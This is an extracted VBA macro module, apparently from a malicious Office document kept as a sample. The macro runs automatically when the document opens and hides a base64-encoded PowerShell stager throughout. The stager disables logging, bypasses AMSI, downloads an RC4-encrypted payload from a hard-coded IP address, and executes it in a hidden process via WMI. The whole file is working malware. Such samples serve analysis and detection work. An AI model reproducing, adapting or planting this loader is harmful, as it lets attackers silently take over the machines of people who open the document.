Filename     : ./macros/a8422d1dd57c432a97ab908c739964efaa0d28b8344e1d6e3121930fe85a421c
OLE stream   : VBA/Module1
VBA filename : Module1.bas
----------------------------------------
Attribute VB_Name = "Module1"

Sub Auto_Open()
        Aw
End Sub

Sub AutoOpen()
        Aw
End Sub

Sub Document_Open()
        Aw
End Sub

Public Function Aw() As Variant
        gTnC = gTnC + "BHAFAAQwBbACcASABLAEUAWQBfAEwATwBDAEEATABfAE0AQQBD"
        gTnC = gTnC + "AEgASQBOAEUAXABTAG8AZgB0AHcAYQByAGUAXABQAG8AbABpAG"
        gTnC = gTnC + "MAaQBlAHMAXABNAGkAYwByAG8AcwBvAGYAdABcAFcAaQBuAGQA"
        gTnC = gTnC + "bwB3AHMAXABQAG8AdwBlAHIAUwBoAGUAbABsAFwAUwBjAHIAaQ"
        gTnC = gTnC + "BwAHQAQgAnACsAJwBsAG8AYwBrAEwAbwBnAGcAaQBuAGcAJwBd"
        gTnC = gTnC + "AD0AJABWAEEATAB9AEUATABzAGUAewBbAFMAYwBSAGkAUAB0AE"
        gTnC = gTnC + "IATABvAGMAawBdAC4AIgBHAEUAdABGAEkAZQBgAEwARAAiACgA"
        gTnC = gTnC + "JwBzAGkAZwBuAGEAdAB1AHIAZQBzACcALAAnAE4AJwArACcAbw"
        gTnC = gTnC + "BuAFAAdQBiAGwAaQBjACwAUwB0AGEAdABpAGMAJwApAC4AUwBF"
        gTnC = gTnC + "AFQAVgBBAEwAdQBlACgAJABOAHUAbABsACwAKABOAEUAdwAtAE"
        gTnC = gTnC + "8AYgBqAGUAQwB0ACAAQwBvAEwAbABFAGMAVABpAG8ATgBzAC4A"
        gTnC = gTnC + "RwBlAG4AZQByAEkAQwAuAEgAQQBzAEgAUwBFAFQAWwBzAHQAcg"
        gTnC = gTnC + "BJAG4AZwBdACkAKQB9AFsAUgBlAGYAXQAuAEEAcwBzAEUAbQBC"
        gTnC = gTnC + "AGwAWQAuAEcAZQBUAFQAWQBwAEUAKAAnAFMAeQBzAHQAZQBtAC"
        gTnC = gTnC + "4ATQBhAG4AYQBnAGUAbQBlAG4AdAAuAEEAdQB0AG8AbQBhAHQA"
        gTnC = gTnC + "aQBvAG4ALgBBAG0AcwBpAFUAdABpAGwAcwAnACkAfAA/AHsAJA"
        gTnC = gTnC + "BfAH0AfAAlAHsAJABfAC4ARwBlAHQARgBJAGUATABkACgAJwBh"
        gTnC = gTnC + "AG0AcwBpAEkAbgBpAHQARgBhAGkAbABlAGQAJwAsACcATgBvAG"
        gTnC = gTnC + "4AUAB1AGIAbABpAGMALABTAHQAYQB0AGkAYwAnACkALgBTAEUA"
        gTnC = gTnC + "VABWAGEAbABVAEUAKAAkAE4AdQBsAEwALAAkAHQAUgBVAGUAKQ"
        gTnC = gTnC + "B9ADsAfQA7AFsAUwBZAFMAVABlAG0ALgBOAEUAdAAuAFMAZQBy"
        gTnC = gTnC + "AHYAaQBDAEUAUABvAEkAbgB0AE0AYQBuAEEAZwBFAHIAXQA6AD"
        gTnC = gTnC + "oARQBYAHAARQBjAHQAMQAwADAAQwBPAG4AVABJAG4AVQBFAD0A"
        gTnC = gTnC + "MAA7ACQAdwBDAD0ATgBFAFcALQBPAEIAagBFAEMAVAAgAFMAeQ"
        gTnC = gTnC + "BzAHQAZQBNAC4ATgBFAFQALgBXAEUAYgBDAGwAaQBlAE4AdAA7"
        gTnC = gTnC + "ACQAdQA9ACcATQBvAHoAaQBsAGwAYQAvADUALgAwACAAKABXAG"
        gTnC = gTnC + "kAbgBkAG8AdwBzACAATgBUACAANgAuADEAOwAgAFcATwBXADYA"
        gTnC = gTnC + "NAA7ACAAVAByAGkAZABlAG4AdAAvADcALgAwADsAIAByAHYAOg"
        gTnC = gTnC + "AxADEALgAwACkAIABsAGkAawBlACAARwBlAGMAawBvACcAOwAk"
        gTnC = gTnC + "AHcAYwAuAEgARQBhAGQAZQBSAHMALgBBAGQARAAoACcAVQBzAG"
        gTnC = gTnC + "UAcgAtAEEAZwBlAG4AdAAnACwAJAB1ACkAOwAkAHcAQwAuAFAA"
        gTnC = gTnC + "UgBPAFgAWQA9AFsAUwBZAHMAVABlAG0ALgBOAGUAVAAuAFcAZQ"
        gTnC = gTnC + "BiAFIARQBRAHUARQBzAHQAXQA6ADoARABFAEYAYQB1AEwAVABX"
        gTnC = gTnC + "AGUAYgBQAFIAbwB4AFkAOwAkAFcAQwAuAFAAcgBvAFgAeQAuAE"
        gTnC = gTnC + "MAcgBlAGQAZQBuAHQAaQBBAEwAUwAgAD0AIABbAFMAWQBTAHQA"
        gTnC = gTnC + "RQBtAC4ATgBFAHQALgBDAHIAZQBkAEUAbgBUAGkAYQBsAEMAYQ"
        gTnC = gTnC + "BDAGgARQBdADoAOgBEAEUAZgBhAFUATAB0AE4ARQBUAHcATwBS"
        gTnC = gTnC + "AEsAQwByAGUARABFAG4AVABJAEEAbABTADsAJABTAGMAcgBpAH"
        gTnC = gTnC + "AAdAA6AFAAcgBvAHgAeQAgAD0AIAAkAHcAYwAuAFAAcgBvAHgA"
        gTnC = gTnC + "eQA7ACQASwA9AFsAUwB5AHMAVABFAG0ALgBUAEUAeAB0AC4ARQ"
        gTnC = gTnC + "BOAGMATwBEAGkAbgBHAF0AOgA6AEEAUwBDAEkASQAuAEcAZQBU"
        gTnC = gTnC + "AEIAeQB0AGUAcwAoACcAPgBBAEcAawBjAG4APABZAGIAUgByAD"
        gTnC = gTnC + "oAcABFAHEAKABsAGgANQA5AE8APQBAAD8AWgAsAHsATgBRADEA"
        gTnC = gTnC + "IwBJACcAKQA7ACQAUgA9AHsAJABEACwAJABLAD0AJABBAFIARw"
        gTnC = gTnC + "BzADsAJABTAD0AMAAuAC4AMgA1ADUAOwAwAC4ALgAyADUANQB8"
        gTnC = gTnC + "ACUAewAkAEoAPQAoACQASgArACQAUwBbACQAXwBdACsAJABLAF"
        gTnC = gTnC + "sAJABfACUAJABLAC4AQwBPAFUATgB0AF0AKQAlADIANQA2ADsA"
        gTnC = gTnC + "JABTAFsAJABfAF0ALAAkAFMAWwAkAEoAXQA9ACQAUwBbACQASg"
        gTnC = gTnC + "BdACwAJABTAFsAJABfAF0AfQA7ACQARAB8ACUAewAkAEkAPQAo"
        gTnC = gTnC + "ACQASQArADEAKQAlADIANQA2ADsAJABIAD0AKAAkAEgAKwAkAF"
        gTnC = gTnC + "MAWwAkAEkAXQApACUAMgA1ADYAOwAkAFMAWwAkAEkAXQAsACQA"
        gTnC = gTnC + "UwBbACQASABdAD0AJABTAFsAJABIAF0ALAAkAFMAWwAkAEkAXQ"
        gTnC = gTnC + "A7ACQAXwAtAEIAWABvAFIAJABTAFsAKAAkAFMAWwAkAEkAXQAr"
        gTnC = gTnC + "ACQAUwBbACQASABdACkAJQAyADUANgBdAH0AfQA7ACQAcwBlAH"
        gTnC = gTnC + "IAPQAnAGgAdAB0AHAAOgAvAC8AMQAzAC4AMgAxADEALgAzADkA"
        gTnC = gTnC + "LgAxADYAOgA4ADAAJwA7ACQAdAA9ACcALwBuAGUAdwBzAC4AcA"
        gTnC = gTnC + "BoAHAAJwA7ACQAVwBjAC4ASABlAGEARABlAHIAcwAuAEEARABE"
        gTnC = gTnC + "ACgAIgBDAG8AbwBrAGkAZQAiACwAIgBzAGUAcwBzAGkAbwBuAD"
        gTnC = gTnC + "0AOQBLAFMANAArAGUAWAB4AFMAUAB0AEMATABoAEgAUgByAHIA"
        gTnC = gTnC + "UgBhAGEAcwBtAGcAcgBzAG8APQAiACkAOwAkAEQAYQB0AEEAPQ"
        gTnC = gTnC + "AkAFcAQwAuAEQATwBXAG4AbABvAGEAZABEAEEAVABBACgAJABT"
        gTnC = gTnC + "AGUAUgArACQAdAApADsAJABpAFYAPQAkAEQAQQBUAGEAWwAwAC"
        gTnC = gTnC + "4ALgAzAF0AOwAkAEQAYQB0AEEAPQAkAGQAYQBUAGEAWwA0AC4A"
        gTnC = gTnC + "LgAkAEQAYQBUAGEALgBMAGUAbgBnAFQAaABdADsALQBKAG8ASQ"
        gTnC = gTnC + "BuAFsAQwBoAEEAcgBbAF0AXQAoACYAIAAkAFIAIAAkAGQAQQBU"
        gTnC = gTnC + "AEEAIAAoACQASQBWACsAJABLACkAKQB8AEkARQBYAA=="
        Const HIDDEN_WINDOW = 0
        strComputer = "."
        Set objWMIService = GetObject("winmgmts:\\" & strComputer & "\root\cimv2")
        Set objStartup = objWMIService.Get("Win32_ProcessStartup")
        Set objConfig = objStartup.SpawnInstance_
        objConfig.ShowWindow = HIDDEN_WINDOW
        Set objProcess = GetObject("winmgmts:\\" & strComputer & "\root\cimv2:Win32_Process")
        objProcess.Create gTnC, Null, objConfig, intProcessID
End Function
